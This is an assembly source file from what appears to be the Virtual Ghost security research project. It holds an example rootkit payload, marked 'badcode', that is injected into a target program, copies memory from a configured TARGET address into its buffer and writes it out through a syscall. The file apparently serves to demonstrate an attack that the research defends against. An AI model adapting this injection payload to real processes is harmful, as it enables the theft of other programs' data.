/*===- injected.S - Example Rootkit =---------------------------------------===
 * 
 *                        Example Virtual Ghost Rootkit
 *
 * This file was developed by the LLVM research group and is distributed under
 * the University of Illinois Open Source License. See LICENSE.TXT for details.
 * 
 *===----------------------------------------------------------------------===
 *
 * This file provides the assembly code that is injected into the target
 * program.
 *
 *===----------------------------------------------------------------------===
 */

#include "rootkit/rkconfig.h"

.global badcode
.global endcode

.text

badcode:
  /*
   * Copy the data from the target to the buffer in which we are running.
   */
  lea 0x800(%rip), %rsi
  movq $TARGET, %rax
  pushq 2(%rax)
  pushq 1(%rax)
  pushq  (%rax)
  popq   (%rsi)
  popq  1(%rsi)
  popq  2(%rsi)

  /*
   * Call the write system call.
   */
  movq $4, %rax
#if 0
  movq $TARGET, %rsi
#endif
  movq $SIZE, %rdx
  syscall
  movq $0x0, 0xfed
endcode:

